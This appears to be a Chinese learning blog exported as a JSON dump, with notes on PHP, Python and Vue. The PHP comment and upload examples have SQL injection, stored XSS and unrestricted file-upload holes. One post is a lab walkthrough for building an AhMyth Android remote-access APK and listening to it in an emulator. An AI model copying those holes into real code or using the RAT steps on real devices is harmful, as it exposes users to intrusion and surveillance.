输出错误消息，提示用户输入正确的用户名或密码。 //sleep(3); &#x2F;&#x2F; 这行代码被注释掉了，所以不会执行。如果取消注释，它将使脚本暂停执行 3 秒。 echo &#39;&lt;h1&gt;&lt;a href=&quot;./index.php&quot;&gt;返回&lt;/a&gt;&lt;/h1&gt;&#39;; 输出一个返回链接，点击后将重定向到 index.php 页面。 主页1234567891011121314151617181920212223&lt;?phpinclude(&quot;./comment.php&quot;);include(&quot;./upload.php&quot;);session_start();header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);if(isset($_SESSION[&#x27;user&#x27;]))&#123; echo &#x27;当前登录用户:&#x27;.$_SESSION[&#x27;user&#x27;].&#x27;&#x27;; if (isset($_GET[&#x27;logout&#x27;])) &#123; // 清除会话数据 session_unset(); session_destroy(); echo &quot;您已成功注销。&lt;br&gt;&quot;; header(&#x27;Location:index.php&#x27;);&#125;echo &#x27;&lt;h1&gt;&lt;a href=&quot;?logout=true&quot;&gt;注销&lt;/a&gt;&lt;/h1&gt;&#x27;;&#125;else&#123;echo &#x27;错误!&#x27;;header(&#x27;Location:index.php&#x27;);&#125;?&gt; include(“.&#x2F;comment.php”);include(“.&#x2F;upload.php”); 代码将comment.php文件包含进来。这个文件包含了关于评论功能的相关代码或设置。 代码将upload.php文件包含进来。这个文件包含了关于文件上传功能的相关代码或设置。 接收和显示评论&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;body&gt; &lt;h1&gt;历史评论&lt;/h1&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;?php if ($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) &#123; if (isset($_POST[&#39;comment&#39;]) &amp;&amp; !empty($_POST[&#39;comment&#39;])) &#123; $comment = $_POST[&#39;comment&#39;]; ​ $link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;数据库连接失败！&quot;); ​ mysqli_query($link, &quot;set names utf8&quot;); ​ $ChaRu = &quot;insert INTO comments (comment) VALUES(&#39;$comment&#39;)&quot;; ​ if (mysqli_query($link, $ChaRu)) &#123; ​ echo &quot;&lt;p&gt;你的评论已成功保存到数据库。&lt;/p&gt;&quot;; ​ &#125; else &#123; ​ echo &quot;&lt;p style=&#39;color: red;&#39;&gt;保存评论时出错。&lt;/p&gt;&quot;; ​ &#125; ​ mysqli_close($link); ​ &#125; ​ &#125; ​ // 显示最近的20条评论 ​ $link = mysqli_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;security&quot;) or exit(&quot;数据库连接失败！&quot;); ​ mysqli_query($link, &quot;set names utf8&quot;); $query = &quot;SELECT * FROM comments ORDER BY id DESC LIMIT 20&quot;; $result = mysqli_query($link, $query); if ($result) &#123; echo &quot;&lt;h2&gt;最近的评论&lt;/h2&gt;&quot;; while ($row = mysqli_fetch_assoc($result)) &#123; echo &quot;&lt;p&gt;&#123;$row[&#39;comment&#39;]&#125;&lt;/p&gt;&quot;; &#125; &#125; else &#123; echo &quot;&lt;p style=&#39;color: red;&#39;&gt;获取评论时出错。&lt;/p&gt;&quot;; &#125; mysqli_close($link); ?&gt; &lt;form method=&quot;post&quot; action=&quot;&quot;&gt; &lt;label for=&quot;comment&quot;&gt;发表评论&lt;/label&gt;&lt;br /&gt; &lt;textarea name=&quot;comment&quot; id=&quot;comment&quot; rows=&quot;10&quot; cols=&quot;80&quot;&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交评论&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 从 comments 表中获取最新的20条评论，并按ID降序排列。 如果成功获取评论，则显示这些评论；否则，显示错误消息。 set names utf8：设置字符集为 UTF-8。 insert INTO comments (comment) VALUES(&#39;$comment&#39;)：将评论插入到 comments 表中。 SELECT * FROM comments ORDER BY id DESC LIMIT 20：从 comments 表中获取最新的20条评论。 上传文件123456789101112131415161718192021222324252627282930&lt;?phpecho &#x27;&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;upload&quot;&gt;上传你的头像&lt;/label&gt;&lt;input name=&quot;file&quot; id=&quot;upload&quot; type=&quot;file&quot; &gt;&lt;label for=&quot;submit&quot; &gt;文件上传&lt;/label&gt;&lt;input name=&quot;submit&quot; id=&quot;submit&quot; type=&quot;submit&quot;&gt;&lt;h1&gt;下面是接收到的文件&lt;/h1&gt;&lt;/form&gt;&#x27;;header(&#x27;Content-Type: text/html; charset=utf-8&#x27;);if(isset($_FILES[&quot;file&quot;]))&#123; $upload_dir = &quot;uploads&quot;; $file_name = $_FILES[&quot;file&quot;][&quot;name&quot;]; $file_type = $_FILES[&quot;file&quot;][&quot;type&quot;]; $file_size = $_FILES[&quot;file&quot;][&quot;size&quot;]; $file_tmp = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]; $target_path = $upload_dir.&#x27;/&#x27;.$file_name; if (move_uploaded_file($file_tmp, $target_path))&#123; echo &quot;上传成功&quot;.&quot;&lt;br&gt;&quot;; echo &quot;文件类型: &quot; . $file_type . &quot;&lt;br&gt;&quot;; echo &quot;文件大小: &quot; . ($file_size / 1024) . &quot; kB&lt;br&gt;&quot;; echo &quot;文件存储的位置: &quot; . $target_path; &#125;else&#123; echo &quot;上传失败&quot;.&quot;&lt;br&gt;&quot;; &#125; echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;img src=&#x27;$target_path.&#x27;&gt;&quot;;&#125;?&gt; 使用 enctype=&quot;multipart/form-data&quot; 来确保可以上传文件。 检查 $_FILES[&quot;file&quot;] 是否设置，这表示是否有文件被上传。 $upload_dir：上传目录的路径。 $file_name：上传文件的名称。 $file_type：上传文件的类型。 $file_size：上传文件的大小。 $file_tmp：上传文件的临时路径。 move_uploaded_file($file_tmp, $target_path) 将临时文件移动到目标路径。如果移动成功，则显示成功消息和文件的详细信息；否则，显示上传失败的消息。 显示上传的图片。","path":"2023/12/13/php学习1/","date":"12-13","excerpt":"","tags":[{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"php函数","slug":"php函数","permalink":"http://example.com/tags/php%E5%87%BD%E6%95%B0/"},{"name":"简单网站功能实现","slug":"简单网站功能实现","permalink":"http://example.com/tags/%E7%AE%80%E5%8D%95%E7%BD%91%E7%AB%99%E5%8A%9F%E8%83%BD%E5%AE%9E%E7%8E%B0/"}]},{"title":"php学习","text":"PHP安装网站搜索phpstudy,在官网下载 phpstudy的mysql会与本地的MySQL相互冲突，要运行的话需要关掉一个，所以最好在虚拟机的环境下。 下载后安装，并打开。 开启第1个和第3个，点击网站，打开管理，修改，高级配置，打开索引目录，进入WWW创建php文件。 编写代码，进入phpstudy点击网站，选择打开网站。 PHP网站知识phpstudy各部分的关系php只能在网站上运行，依托与网站。 Apache是一个流行的Web服务器软件，它负责处理HTTP请求并返回网页内容。它提供了对PHP脚本的执行环境，可以将PHP代码嵌入到HTML文件中，并在服务器端执行。 PHP是一种服务器端脚本语言，它可以在Web服务器上执行，并且与Apache服务器紧密集成。PHP可以生成动态内容，处理表单数据，访问数据库，生成动态网页等。在PHPStudy中，你可以通过配置Apache来启用PHP脚本的解释和执行。 MySQL是一个关系型数据库管理系统（RDBMS），用于存储和管理网站的数据。它与PHP相互协作，通过使用PHP中的MySQL扩展，你可以从PHP脚本中连接到MySQL数据库并执行各种操作，例如插入、更新、查询和删除数据。 ​ 在PHPStudy中，Apache、PHP和MySQL通常一起工作，以提供一个完整的Web开发环境。当你编写一个包含PHP代码的网页时，当有人访问该网页时，Apache服务器将执行PHP代码，并将结果返回给访问者。同时，你可以使用MySQL来存储和管理网站的数据，并通过PHP与MySQL进行交互，以从数据库中检索数据或将数据存储到数据库中。 ​ 为了在PHPStudy中配置PHP、MySQL和Apache的关系，需要进行一些设置和配置。这包括在Apache中启用PHP解释器，以及在PHP中配置MySQL连接参数。通过正确的配置，你可以确保这些组件能够协同工作，以提供动态的、数据驱动的网站内容。 PHP基础知识 语法：PHP的语法包括变量、数据类型、运算符、条件语句、循环语句、函数等基本概念。 PHP 脚本可以放在文档中的任何位置。 PHP 脚本以 结束 PHP 文件的默认文件扩展名是 .php。 PHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。 PHP 中的每个代码行都必须以分号结束。分号是一种分隔符，用于把指令集区分开来。 通过 PHP，有两种在浏览器输出文本的基础指令：echo 和 print。 变量：在PHP中，变量可以存储各种类型的数据，如字符串、整数、浮点数、布尔值等。变量名以符号开头，后面跟着变量名。例如：name &#x3D; “John”; 与代数类似，可以给 PHP 变量赋予某个值（x&#x3D;5）或者表达式（z&#x3D;x+y）。 变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。 PHP 没有声明变量的命令。变量在第一次赋值给它的时候被创建 数据类型：PHP支持多种数据类型，包括字符串（String）、整数（Integer）、浮点数（Float）、布尔值（Boolean）、数组（Array）、对象（Object）等。 PHP 是一门弱类型语言​ PHP 会根据变量的值，自动把变量转换为正确的数据类型。 ​ 在强类型的编程语言中，我们必须在使用变量前先声明（定义）变量的类型和名称。 弱类型匹配，&#x3D;&#x3D; 强类型匹配，&#x3D;&#x3D;&#x3D; PHP 循环 - For 循环语法 1234for (初始值; 条件; 增量)&#123; 要执行的代码;&#125; 初始值：主要是初始化一个变量值，用于设置一个计数器（但可以是任何在循环的开始被执行一次的代码）。 条件：循环执行的限制条件。如果为 TRUE，则循环继续。如果为 FALSE，则循环结束。 增量：主要用于递增计数器（但可以是任何在循环的结束被执行的代码）。 利用for循环，我们可以完成一个简单的鸡兔同笼问题计算。假设在笼子里有头数为8的鸡和兔子，总共有22只脚。鸡兔各几只。 NavicatPremium下载安装 官网下载，安装，打开，建立连接。命名，设置密码，连接测试。 表单和数据库连接​ 利用学的知识，我们可以表单向数据库查内容再返回页面。 ​ 创建一个数据库连接，以便能够与数据库进行通信。可以使用PHP的mysqli等扩展库来实现连接。根据数据库类型和配置，具体的连接代码会有所不同。 ​ 创建表单：在HTML中创建一个表单，其中包含输入字段（例如文本框、下拉列表等），用于接收用户输入的数据。设置表单的method属性为POST，将数据以POST请求的方式提交给服务器。 ​ 创建一个PHP文件（例如link.php），用于处理表单提交的数据，并与数据库进行交互。在这个文件中，可以获取通过POST方法提交的用户名和密码。然后，使用SQL查询语句在数据库中查找匹配的记录。 axiosAxios是一个基于promise的HTTP库，类似于jQuery的ajax，用于HTTP请求。它可以应用于浏览器端和node.js，既可以用于客户端，也可以用于node.js编写的服务端。Axios具有以下特性： 支持Promise API。 拦截请求与响应，例如在请求前添加授权和响应前做一些事情。 转换请求数据和响应数据，例如进行请求加密或者响应数据加密。 取消请求。 自动转换JSON数据。 客户端支持防御XSRF。 ​ 使用方法 ​ 发送请求：使用axios的实例方法发送请求。例如，使用axios的get方法发送get请求，使用axios的post方法发送post请求。 ​ 配置参数：在发送请求时，可以通过配置参数来设置请求头、请求路径、请求体等。例如，使用axios的get方法发送get请求时，可以通过params参数来设置请求路径的参数。使用axios的post方法发送post请求时，可以通过data参数来设置请求体。 执行 POST 请求方式 12345678910$http.post(&#x27;/user&#x27;, &#123; firstName: &#x27;Fred&#x27;, lastName: &#x27;Flintstone&#x27; &#125;) .then(function (response) &#123; console.log(response); &#125;) .catch(function (error) &#123; console.log(error); &#125;); axios API可以通过将相关配置传递给 axios 来进行请求。axios(config) &#x2F;&#x2F; 发送一个 POST 请求 123456789axios(&#123; method: &#x27;post&#x27;, url: &#x27;/user/12345&#x27;, data: &#123; firstName: &#x27;Fred&#x27;, lastName: &#x27;Flintstone&#x27; &#125;&#125;); axios(&#123;：这行代码开始了一个axios的配置对象。axios是一个基于promise的HTTP库，它可以用于浏览器和node.js。这个配置对象包含了发送请求所需的所有信息。 method: &#39;post&#39;,：这行代码设置了HTTP请求的方法为’POST’。POST请求通常用于提交数据到服务器。 url: &#39;/user/12345&#39;,：这行代码设置了请求的URL。在这个例子中，请求是发送到/user/12345这个路径。 data: &#123;：这行代码开始了一个数据字段，这个字段包含了要发送到服务器的数据。 firstName: &#39;Fred&#39;,：这行代码在数据对象中设置了一个名为’firstName’的字段，其值为’Fred’。 lastName: &#39;Flintstone&#39;：这行代码在数据对象中设置了一个名为’lastName’的字段，其值为’Flintstone’。 纵使困顿难行，亦当砥砺奋进!","path":"2023/12/12/php学习/","date":"12-12","excerpt":"","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"Navicat","slug":"Navicat","permalink":"http://example.com/tags/Navicat/"},{"name":"安装","slug":"安装","permalink":"http://example.com/tags/%E5%AE%89%E8%A3%85/"}]},{"title":"python学习2","text":"if语句执行规则 if 条件： ​ 代码 ​ 如果条件成立就执行代码，如果不成立就不执行。 2 ​ if 条件： ​ 代码1 ​ else： ​ 代码2 ​ 如果条件成立执行代码1，否则执行2 3 if语句可以嵌套并且可以无限的嵌套 ​ if 条件1： ​ if条件2: ​ XXXX ​ else： ​ XXXX ​ else: ​ 代码块 如果不想if嵌套太深则可以这样使用 if条件 1: ​ 代码1 elif 条件2: ​ 代码2 elif 条件3: ‘’’’’’ else: ​ XXX 循环语句for循环 ​ for循环是一种常用的编程结构，用于重复执行一段代码，直到满足特定的条件。在for循环中，通常会定义一个计数器变量，该变量的初始值、终止条件和递增或递减的方式都会在循环开始前确定。每次循环迭代时，计数器变量的值会自动更新，直到达到终止条件，循环才会停止。一般for循环用的多，while循环一般用于死循环 while循环 ​ while循环是一种基本的循环结构，适用于不确定循环次数的情况。while循环由关键字while、循环条件和循环体组成。当循环条件为真时，循环体会一直执行，直到循环条件变为假，循环才会结束。 例如使用while循环来计算数字1到10的和： ​ 这个例子中，num 变量从1开始，每次循环增加1，直到 num 大于10时循环停止。在循环体内，我们将 num 加到 total 变量上，最终输出 total 的值。 break和continue语句 ​ 1.break 语句：break语句主要用于循环结构中，当程序遇到break语句时，会立即终止当前循环，跳出该循环体，执行后面的代码。如果是在嵌套循环中，break只会终止当前循环，不会影响到其他循环。 ​ 2.continue 语句：continue语句同样主要用于循环结构中，当程序遇到continue&#96;语句时，会立即跳过本次循环中剩余的代码，并开始执行下一次循环。 字典​ 字典（Dictionary）是一种数据结构，它将一个键（Key）与一个值（Value）进行关联。键和值可以是任何类型的数据，如数字、字符串、列表等。字典通常用于存储和检索相关联的数据集，可以通过键来快速地查找和访问对应的值。字典是以键值对的形式进行存储的。 ​ 在Python中，字典是一种内置的数据类型，使用大括号 {} 来定义。每个键值对之间使用冒号 : 分隔，不同的键值对之间使用逗号 , 分隔。字典表示方式：{key:value1,key2:value2,key3:value} ​ 字典的key必须是可哈希的数据类型，value可以是任何数据类型。 增加新的键值对可以使用 dict[key] = value 的形式来添加新的键值对。例如： 删除键值对可以使用 del dict[key] 的形式来删除键值对。例如： 修改键值对可以使用 dict[key] = new_value 的形式来修改键值对的值。例如： 查找键值对​ 可以使用 dict[key] 的形式来查找键对应的值。例如：","path":"2023/12/11/python学习2/","date":"12-11","excerpt":"","tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"if条件判断","slug":"if条件判断","permalink":"http://example.com/tags/if%E6%9D%A1%E4%BB%B6%E5%88%A4%E6%96%AD/"},{"name":"循环语句","slug":"循环语句","permalink":"http://example.com/tags/%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5/"}]},{"title":"安卓病毒监听","text":"一、反弹shell和正向shell反弹SHELL ​ 控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。 正向shell可能会出现bug，会有window或者Linux的防火墙抵御来自sever的监听。 但是反向shell不会，因为反向shell是客户机c出栈，正向shell是入栈。 解决防火墙抵御bug的解决方法 直接关闭防火墙或者在防火墙高级设置中允许连接 二、使用mumu进行病毒监听1.在官网上下载mumu模拟器版本，下载mumu6 https://mumu.163.com/index.html 2.安装好AhMyth程序 AHMYTH TASORT EDGE 3.win+r,输入cmd，输入ipconfig查找自己的ip 4.打开AhMyth，在Source IP中输入刚刚获取到的ip，端口号默认即可，然后点击Build 5.找到生成的apk文件 6.打开mumu模拟器，点击安装，选择刚刚生成的apk文件 7.可以看到桌面上多了一个安卓图标 8.切换到AhMyth，点击Listen,然后回到mumu双击安卓图标 9.点击Open The Lab，然后可以发现打开了一个新窗口。利用这个窗口可以实现对mumu模拟器的监听。 三、java的安装和环境配置1.下载Java安装包2.新建两个文件夹，分别命名为java8和java_jre 3.点击安装，将目录更换到java8文件夹下，然后点击下一步 安装 4.将目标文件夹的路径更换到java_jre文件夹中，然后下一步 5.右击此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量， 6.找到系统变量的Path变量，双击打开 7.将新建的两个文件夹的路径加进去，然后确定，这样java环境就配置好了 编辑环境变量","path":"2023/12/10/安卓病毒监听/","date":"12-10","excerpt":"","tags":[]},{"title":"python列表元组","text":"列表和元组​ 数据结构是以某种方式（如通过编号）组合起来的数据元素（如数、字符乃至其他数据结构）集合。Python中最基本的数据结构是 序列（sequence）。 ​ 序列中的每个元素都有编号，即其位置或索引，其中第一个元素的索引位0，第二个元素的索引位1，依次类推。 ​ 列表和元组的主要不同在于，列表是可以修改的，而元组不可以。列表适用于需要中途添加元素的情形，而元组适用于处于某种考虑需要禁止修改序列的情形。几乎所有情况下都可使用列表来代替元组，一种情况例外：将元组用作字典键。在需要处理一系列值时，序列很有用。 ​ 适用于所有序列的操作： 索引、切片、相加、相乘 和 成员资格检查。还有一个重要的操作：迭代（iteration）。 索引序列中的所有元素都有编号——从0开始递增。 可使用 切片（slicing）来访问特定范围内的元素。 序列相加可使用加法运算符来拼接序列。 乘法将序列与数 x 相乘时，将重复这个序列 x 次来创建一个新序列。 ​ 要检查特定的值是否包含在序列中，可使用运算符 in。它检查是否满足指定的条件，并返回相应的值：满足时返回True，不满足时返回False。这样的运算符称为布尔运算符，而前述真值称为布尔值。 列表函数 list使用字符串创建列表，可使用函数 list。 12&gt;&gt;&gt; list(&#x27;world&#x27;) [&#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;l&#x27;, &#x27;d&#x27;] 注意，可将任何序列（而不仅仅是字符串）作为list的参数。 修改列表：给元素赋值使用索引表示法给特定位置的元素赋值，如 x[1] &#x3D; 2。 1234&gt;&gt;&gt; x=[1,1,1] &gt;&gt;&gt; x[1]=2 &gt;&gt;&gt; x [1, 2, 1] 注意：不能给不存在的元素赋值。 删除元素使用 del 语句，从列表中删除元素： 12345&gt;&gt;&gt; names = [&#x27;abandon&#x27;,&#x27;loss&#x27;,&#x27;good&#x27;,&#x27;email&#x27;,&#x27;error&#x27;] &gt;&gt;&gt;&gt;&gt;&gt; del names[2] &gt;&gt;&gt; names [&#x27;abandon&#x27;, &#x27;loss&#x27;, &#x27;email&#x27;, &#x27;error&#x27;] 给切片赋值切片是一项极其强大的功能，而能够给切片赋值让这项功能显得更加强大。 123456&gt;&gt;&gt; name = list(&#x27;Perl&#x27;) &gt;&gt;&gt; name &gt;&gt;&gt; [&#x27;P&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;l&#x27;]&gt;&gt;&gt; name[2:] = list(&#x27;ar&#x27;) &gt;&gt;&gt; name [&#x27;P&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;r&#x27;] 可同时给多个元素赋值。通过使用切片赋值，可将切片替换为长度与其不同的序列。 列表方法方法是与对象（列表、数、字符串等）联系紧密的函数。通常，如下方法调用： object.method(arguments) 列表包含多个用来查看和修改其内容的方法： append方法 ,append 用于将一个对象附加到列表末尾。 clear方法, clear 就地清空列表的内容。 copy方法, copy 复制列表。常规复制只是将另一个名称关系到列表。 count方法, count 计算指定的元素在列表中出现了多少次. extend方法, extend 能够同时将多个值附加到列表末尾，为此可将这些值组成的序列作为参数提供个方法extend。换言之，可使用一个列表来扩展另一个列表。 index方法 ,index 在列表中查找指定值第一次出现的索引。 insert方法, insert 用于将一个对象插入列表。 pop方法, pop 从列表中删除一个元素（末尾为最后一个元素），并返回这一元素。 remove方法, remove 用于删除第一个为指定值的元素。 reverse方法 ,reverse 按相反的顺序排序列列表中的元素。 sort方法, sort 用于对列表就地排序。意味着对原来的列表进行修改，使其元素按顺序排列，而不是返回排序后的列表的副本。 高级排序方法 ,sort 接受两个可选参数：key 和 reverse。这两个参数通常是按名称指定的，称为关键字参数。参数key类似于参数 cmp：将其设置为一个用于排序的函数。根据长度对元素进行排序，可将参数key设置为函数len。 元组：不可修改的序列​ 与列表一样，元组也是序列，唯一的差别在于元组是不能修改的。​ 元组的语法很简单，只要将一些值用逗号分隔，就能自动创建一个元组。 ​ 元组还可用圆括号括起来。 ​ 空元组用两个不包含任何内容的圆括号表示。 ​ 只包含一个值的元组，也必须在它后面加上逗号。 ​ 函数tuple的工作原理与 list很像：它将一个序列作为参数，并将其转换为元组。如果参数已经是元组，就原封不动地返回它。 ​ 元组的创建及其元素的访问方式与其他序列相同。 ​ 元组的切片也是元组，就像列表的切片也是列表一样。 123456789101112131415161718# 元组的不可变性tup = (&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;)tup[1] = &#x27;改变&#x27;print(tup) # 创建空元组a = ()print(type(a))# 当元组只有一个元素时需要在末尾加一个逗号，# 否则会解析为括号的运算方法a = (3)print(type(a))a = (3,)print(type(a))&lt;class &#x27;int&#x27;&gt;&lt;class &#x27;tuple&#x27;&gt; 1234567891011# 多个元素的元组创建# 可以不用加括号a = 1,2print(type(a))b = (1,2)print(type(b))# 多种类型元素的元组a = (&#x27;a&#x27;,1.2,None,True,[1,2])print(type(a)) range()对象生成元组 12a = tuple(range(1,9,2))print(a,type(a)) 列表转元组方法123456789101112lst = [&#x27;a&#x27;,&#x27;s&#x27;,True]a = tuple(lst)print(a,type(a))(&#x27;a&#x27;, &#x27;s&#x27;, True) &lt;class &#x27;tuple&#x27;&gt;a = (&#x27;a&#x27;, &#x27;s&#x27;, True)当然元组也可以转为列表b = list(a)print(b,type(b))[&#x27;a&#x27;, &#x27;s&#x27;, True] &lt;class &#x27;list&#x27;&gt; 元组的连接与复制元组的连接，与列表类似，通过+连接 123456789101112a = (1,2)b = (3,4)a+b(1, 2, 3, 4)元组的复制，与列表类似，通过* 复制a = (&#x27;a&#x27;,)a * 4(&#x27;a&#x27;, &#x27;a&#x27;, &#x27;a&#x27;, &#x27;a&#x27;) 索引与切片，与列表的操作类似 元组的常用操作12345678910111213141516查询元组的长度tup = (1,2,&#x27;a&#x27;,True,None,[1,2,3])len(tup)6获取纯数值元组的最大值、最小值和总和a = tuple(range(1,11))print(&#x27;最大值为：&#x27;,max(a))print(&#x27;最小值为：&#x27;,min(a))print(&#x27;总 和为：&#x27;,sum(a))最大值为： 10最小值为： 1总 和为： 55 1234567891011121314151617181920212223查询索引值tup.index(&#x27;a&#x27;)2统计元组的元素出现的次数tup.count(1)2删除元组(只能删除整个元组，不能删除具体的元素)del tuptup---------------------------------------------------------------------------NameError Traceback (most recent call last)&lt;ipython-input-72-cbde4a271b58&gt; in &lt;module&gt;() 1 del tup----&gt; 2 tupNameError: name &#x27;tup&#x27; is not defined 12345678910111213141516for遍历元组tup = (1,2,&#x27;a&#x27;,True,None,[1,2,3])for i in tup: print(i) 12aTrueNone[1, 2, 3]判断某个元素是否在元组中tup = (1,2,&#x27;a&#x27;,True,None,[1,2,3])None in tupTrue if语句执行规则 if 条件： ​ 代码 ​ 如果条件成立就执行代码，如果不成立就不执行。 2 ​ if 条件： ​ 代码1 ​ else： ​ 代码2 ​ 如果条件成立执行代码1，否则执行2 3 if语句可以嵌套并且可以无限的嵌套 ​ if 条件1： ​ if条件2: ​ XXXX ​ else： ​ XXXX ​ else: ​ 代码块 如果不想if嵌套太深则可以这样使用 if条件 1: ​ 代码1 elif 条件2: ​ 代码2 elif 条件3: ‘’’’’’ else: ​ XXX 循环语句for循环​ for循环是一种常用的编程结构，用于重复执行一段代码，直到满足特定的条件。在for循环中，通常会定义一个计数器变量，该变量的初始值、终止条件和递增或递减的方式都会在循环开始前确定。每次循环迭代时，计数器变量的值会自动更新，直到达到终止条件，循环才会停止。一般for循环用的多，while循环一般用于死循环 while循环​ while循环是一种基本的循环结构，适用于不确定循环次数的情况。while循环由关键字while、循环条件和循环体组成。当循环条件为真时，循环体会一直执行，直到循环条件变为假，循环才会结束。 例如使用while循环来计算数字1到10的和： ​ 这个例子中，num 变量从1开始，每次循环增加1，直到 num 大于10时循环停止。在循环体内，我们将 num 加到 total 变量上，最终输出 total 的值。 break和continue语句​ 1.break 语句：break语句主要用于循环结构中，当程序遇到break语句时，会立即终止当前循环，跳出该循环体，执行后面的代码。如果是在嵌套循环中，break只会终止当前循环，不会影响到其他循环。 ​ 2.continue 语句：continue语句同样主要用于循环结构中，当程序遇到continue&#96;语句时，会立即跳过本次循环中剩余的代码，并开始执行下一次循环。 字典​ 字典（Dictionary）是一种数据结构，它将一个键（Key）与一个值（Value）进行关联。键和值可以是任何类型的数据，如数字、字符串、列表等。字典通常用于存储和检索相关联的数据集，可以通过键来快速地查找和访问对应的值。字典是以键值对的形式进行存储的。 ​ 在Python中，字典是一种内置的数据类型，使用大括号 {} 来定义。每个键值对之间使用冒号 : 分隔，不同的键值对之间使用逗号 , 分隔。字典表示方式：{key:value1,key2:value2,key3:value} ​ 字典的key必须是可哈希的数据类型，value可以是任何数据类型。 增加新的键值对可以使用 dict[key] = value 的形式来添加新的键值对。例如： 删除键值对可以使用 del dict[key] 的形式来删除键值对。例如： 修改键值对可以使用 dict[key] = new_value 的形式来修改键值对的值。例如： 查找键值对​ 可以使用 dict[key] 的形式来查找键对应的值。例如：","path":"2023/12/09/python学习1/","date":"12-09","excerpt":"","tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"列表","slug":"列表","permalink":"http://example.com/tags/%E5%88%97%E8%A1%A8/"},{"name":"元组","slug":"元组","permalink":"http://example.com/tags/%E5%85%83%E7%BB%84/"}]},{"title":"vue学习","text":"vue学习Vue概述 Vue 是一套用于构建用户界面的渐进式框架，发布于2014年2月。 与其它大型框架不同的是，Vue被设计为可以自底向上逐层应用。 Vue的核心库只关注视图层，不仅易于上手，还便于与第三方库(如: vue-router: 跳转，vue-resource: 通信，vuex:管理)或既有项目整合。 官网：https://cn.vuejs.org/ 三要素 HTML (结构) :超文本标记语言(Hyper Text Markup Language) ，决定网页的结构和内容。 CSS (表现) :层叠样式表(Cascading Style sheets) ，设定网页的表现样式。 JavaScript (行为) :是一种弱类型脚本语言，其源代码不需经过编译，而是由浏览器解释运行,用于控制网页的行为。 vue下载安装 1npm config set refistry https://registry.npm.taobao.org npm install -g @vue/cli 到项目目录 123vue create xxxxnpm run serve选择vue2 vue3引入element-plus 123npm create vue@latestnpm install element-plus --savenpm install -D unplugin-vue-components unplugin-auto-import 这时候vue已经安装好了，可以在vscode中打开。 点开vue.app文件就会出现如图 但这是初始设置，最好改一下配置文件 12345678main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import ElementPlus from &#x27;element-plus&#x27;;import &#x27;element-plus/dist/index.css&#x27;createApp(App).mount(&#x27;#app&#x27;) Vue基础语法Vue.config.productionTip &#x3D; false &#x2F;&#x2F;阻止vue在启动时生成提示Vue实例和容器是一一对应的 src&#x2F;App.vue是入口文件script &#x2F;&#x2F;导包template。 &#x2F;&#x2F;html部分style &#x2F;&#x2F;css部分 vite.config.js配置文件 1234567891011121314151617181920212223242526import &#123; fileURLToPath, URL &#125; from &#x27;node:url&#x27;import &#123; defineConfig &#125; from &#x27;vite&#x27;import vue from &#x27;@vitejs/plugin-vue&#x27;import AutoImport from &#x27;unplugin-auto-import/vite&#x27;import Components from &#x27;unplugin-vue-components/vite&#x27;import &#123; ElementPlusResolver &#125; from &#x27;unplugin-vue-components/resolvers&#x27;// https://vitejs.dev/config/export default defineConfig(&#123; plugins: [ vue(), // ... AutoImport(&#123; resolvers: [ElementPlusResolver()], &#125;), Components(&#123; resolvers: [ElementPlusResolver()], &#125;), ], resolve: &#123; alias: &#123; &#x27;@&#x27;: fileURLToPath(new URL(&#x27;./src&#x27;, import.meta.url)) &#125; &#125;&#125;) 学习vue可以去Element,上面很多组件都可以直接用，内容齐全https://element-plus.org/ 案例下面可以直接查看源代码。 将代码复制到vue.app中可以直接运行 这是运行效果。vue有js和ts,编写时有部分不同。 vue的特点​ Vue.js 是一种用于构建用户界面的 JavaScript 框架。它被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，也便于与第三方库或已有项目整合。 Vue.js 的主要特点有： 响应式数据绑定：Vue.js 使用数据劫持和发布订阅模式来实现响应式数据绑定。当数据发生变化时，视图也会随之更新。 组件化：Vue.js 采用组件化开发方式，将界面划分为一个个组件，每个组件可以独立开发、测试、维护。 模板语法：Vue.js 使用模板语法，通过模板语法可以将数据渲染到 DOM 中，实现数据的动态展示。 轻量级易上手：Vue.js 的核心库只有 20KB 左右，而且它提供了非常完善的文档和丰富的示例，使得开发者可以很快上手并开发出实用的应用程序。 良好的性能：Vue.js 通过虚拟 DOM、diff算法等优化技术，使得其在性能方面表现出色，即使在处理大量数据时也能保持流畅的界面更新。 Vue.js 可以用于构建单页面应用（SPA）、多页面应用（MPA）以及各种交互式的 Web 界面。 ​ 例如用vue组件模仿一个用户管理的页面，就可以用container容器和表单，图标等组件来完成。 完成效果。 当然因为技术原因，与原图还是有差距。 const数组​ 